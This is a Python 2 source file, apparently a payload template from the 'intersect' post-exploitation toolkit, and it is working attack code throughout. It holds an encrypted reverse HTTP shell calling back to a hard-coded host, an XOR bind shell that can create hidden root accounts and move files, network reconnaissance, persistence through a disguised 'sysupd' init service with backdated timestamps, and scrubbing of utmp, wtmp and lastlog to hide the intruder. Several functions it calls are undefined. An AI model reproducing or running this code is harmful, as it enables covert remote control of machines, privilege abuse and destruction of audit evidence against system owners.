#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
	option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
         pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
       if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['aeshttp', 'xorshell', 'network', 'persistent', 'scrub']
    PORT = 4444
    RHOST = '192.168.1.4'
    RPORT = 5555
    PPORT = 8080
    PKEY = 'QXKISJFTAA'


# Reverse HTTP AES shell. Opens a shell to your remote host and uses AES encryption to protect the data being transmitted over the wire. Written by ReL1K.
def aeshttp():
    import httplib
    import urllib
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] Python Crypto library is not installed. This module will not work without this!")
        sys.exit(2) 

    BLOCK_SIZE = 32
    PADDING = '{'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"

    cipher = AES.new(secret)

    while 1:

	    req = urllib2.Request('http://%s:%s' % (RHOST,RPORT))
	    message = urllib2.urlopen(req)
	    message = base64.b64decode(message.read())
	    message = DecodeAES(cipher, message)

	    if message == "killme":
                sys.exit()
            if message.startswith("cd"):
	        destination = message[3:].replace('\n','')
                if os.path.isdir(destination):
	            os.chdir(destination)
                else:
	            pass


	    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

	    data = proc.stdout.read() + proc.stderr.read()
   	    data = EncodeAES(cipher, data)
    	    data = base64.b64encode(data)
    	    data = urllib.urlencode({'cmd': '%s'}) % (data)
    	    h = httplib.HTTPConnection('%s:%s' % (RHOST,RPORT))
    	    headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
            h.request('POST', '/index.aspx', data, headers)



# Starts a XOR ciphered bind shell on the remote system. Provides extra security. Offers you the ability to run Intersect tasks via the remote shell.
def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


def xorshell():
    HOST = ''
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        print("[+] Shell bound on port %s" % PORT)
        conn, addr = server.accept()
        print "[+] New Connection: %s" % addr[0]
        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
    except:
        print "[!] Connection closed."
    	sys.exit(2)
    
    while True:
        cmd = conn.recv(socksize)
        cmd2 = xor(cmd, PKEY)
        proc = Popen(cmd2,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()
        if cmd2.startswith('cd'):
	    destination = cmd2[3:].replace('\n','')
            if os.path.isdir(destination):
	        os.chdir(destination)
	        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            elif os.path.isdir(os.getcwd()+destination):
                os.chdir(os.getcwd()+destination)
                conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
            else:
	        conn.send(xor("[!] Directory does not exist", PKEY)) 
	        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send(xor("[+] Root account " + acct + " has been created.\n", PKEY)) 
        elif cmd2 == ("httproxy"):
	    httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
            conn.send(xor("[+] Serving HTTP proxy on port "+ PPORT +"", PKEY))
	    httpd.serve_forever()  
        elif cmd2.startswith('upload'):
            getname = cmd2.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            data = conn.recv(socksize)
            filedata = xor(data, PKEY)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send(xor("[+] File upload complete!", PKEY))
            if not os.path.isfile(filename):
                conn.send(xor("[!] File upload failed! Please try again", PKEY))
        elif cmd2.startswith('download'):
            getname = cmd2.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, PKEY)
                conn.sendall(senddata)
            else:
                conn.send(xor("[+] File not found!", PKEY))
        elif cmd2.startswith("rebootsys"):
            conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
            os.system("shutdown -h now")
        elif cmd2 == ("extask osinfo"):
            Gather_OS()
            conn.send(xor("\n[+] OS Info Gathering complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask network"):
            NetworkInfo()
            conn.send(xor("\n[+] Network Gather complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask credentials"):
            GetCredentials()
            conn.send(xor("\n[+] Credentials Gather complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask livehosts"):
            NetworkMap()
            conn.send(xor("\n[+] Network Map complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask findextras"):
            FindExtras()
            conn.send(xor("\n[+] Extras Gather complete.", PKEY))
            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ("extask scrub"):
            ScrubLog()
            conn.send(xor("\n[+] Scrubbing complete.", PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
        elif cmd2 == ('killme'):
            conn.send(xor("[!] Shutting down shell!\n", PKEY))
            conn.close()
            sys.exit(0)
        elif proc:
            conn.send(xor( stdout , PKEY))
            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))




# Finds and saves network information such as listening ports, firewall rules, DNS configurations, network interfaces and active connections.
def network():
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    os.mkdir(Temp_Dir+"/network")
    networkdir = (Temp_Dir+"/network")
    os.chdir(networkdir) 

    proc = Popen('netstat --tcp --listening',
         shell=True,
         stdout=PIPE,
         )
    output = proc.communicate()[0]

    file = open("nstat.txt","a")
    for items in output:
        file.write(items),
    file.close() 

    os.system("lsof -nPi > lsof.txt")
    ports = ["nstat.txt","lsof.txt"]
    content = ''
    for f in ports:
        content = content + '\n' + open(f).read()
    open('Connections.txt','wb').write(content)
    os.system("rm nstat.txt lsof.txt")
    if whereis('iptables') is not None:
        os.system("iptables -L -n > iptablesLN.txt") 
        os.system("iptables-save > iptables_save.txt")
    else:
        pass

    os.system("ifconfig -a > ifconfig.txt")


    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
        os.system("hostname -I > IPAddresses.txt")
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
        splitIP = localIP.split('.')
        splitIP[3:] = (['0/24'])
        IPRange = ".".join(splitIP)
        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
        file = open("IPAddresses.txt", "a")
        file.write("External IP Address: " + externalIP)
        file.write("Internal IP Address: " + localIP)
        file.write("Internal IP Range: " + IPRange)
        file.close
   
    os.system("hostname -f > hostname.txt")
   
    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
    content = ''
    for f in netfiles:
        content = content + '\n' + open(f).read()
    open('NetworkInfo.txt','wb').write(content)
    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")

    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
    for x in network:
        if os.path.exists(x) is True:
            shutil.copy2(x, networkdir)
   

# Lets you install an Intersect shell as a persistent service on the target. You must define your shell type and file location when prompted.
def persistent():
	header = " => "
	print("Full path of your Intersect script: ")
	currentfile = raw_input("%s " % (header))

	if os.path.exists(currentfile) is True:
		shutil.copy2(currentfile, "/etc/default/sysupd")
	else:
		print("[!] Incorrect file path, Try again!")
		persistent()


	print("Specify which shell to use: ")
	shell = raw_input("%s " % (header))

	if shell in modList is False:
		print("[!] Shell module not loaded!")
		persistent()
	else:
		if os.path.isdir("/etc/init.d"):
			serwrite = open("/etc/init.d/sysupd", "w")
			serwrite.write("#!/bin/sh\ncd /etc/default/\nsudo python sysupd --%s &" % shell)
			serwrite.close()
			os.system("chmod +x /etc/init.d/sysupd")
			os.system("update-rc.d sysupd defaults")
			print("[+] Persistent service installed.")
			print("[+] Modifying touch times on shell files...")
			os.system("touch -t 200512311216 /etc/default/sysupd")
			os.system("touch -t 200512311216 /etc/init.d/sysupd")
			print("[+] Attempting to lock down shell files...")
			if whereis('chattr') is not None:
				os.system("chattr +i /etc/default/sysupd")
				os.system("chattr +i /etc/init.d/sysupd")
			else:
				print("[!] Chattr not found. Could not lock files.")

			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")





# Attempts to remove the current username and IP address from log files such as utmp, wtmp and lastlog. Intrusive method.
def scrub():  
  try:
    Current_User = os.getlogin()
  except OSError:
    print "[!] Cannot find user in logs. Did you all ready run --scrub ?"
    return
    
  newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
  writeNewFile(UTMP_FILEPATH, newUtmp)
  print "[+] %s cleaned" % UTMP_FILEPATH
  
  newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
  writeNewFile(WTMP_FILEPATH, newWtmp)
  print "[+] %s cleaned" % WTMP_FILEPATH

  newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
  writeNewFile(LASTLOG_FILEPATH, newLastlog)
  print "[+] %s cleaned" % LASTLOG_FILEPATH


def scrubFile(filePath, Current_User):
  newUtmp = ""
  with open(filePath, "rb") as f:
    bytes = f.read(UTMP_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
      if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
	newUtmp += bytes
      bytes = f.read(UTMP_STRUCT_SIZE)
  f.close()
  return newUtmp


def scrubLastlogFile(filePath, Current_User):
  pw  	     = pwd.getpwnam(Current_User)
  uid	     = pw.pw_uid
  idCount    = 0
  newLastlog = ''
  
  with open(filePath, "rb") as f:
    bytes = f.read(LASTLOG_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hh32s256s", bytes)
      if (idCount != uid):
	newLastlog += bytes
      idCount += 1
      bytes = f.read(LASTLOG_STRUCT_SIZE)
  return newLastlog


def writeNewFile(filePath, fileContents):
  f = open(filePath, "w+b")
  f.write(fileContents)
  f.close()




def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('     -a   --aeshttp')
    print('     -x   --xorshell')
    print('     -n   --network')
    print('     -p   --persistent')
    print('     -s   --scrub')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'axnps', ['aeshttp', 'xorshell', 'network', 'persistent', 'scrub', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-a', '--aeshttp'):
            aeshttp()
        elif o in ('-x', '--xorshell'):
            xorshell()
        elif o in ('-n', '--network'):
            network()
        elif o in ('-p', '--persistent'):
            persistent()
        elif o in ('-s', '--scrub'):
            scrub()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])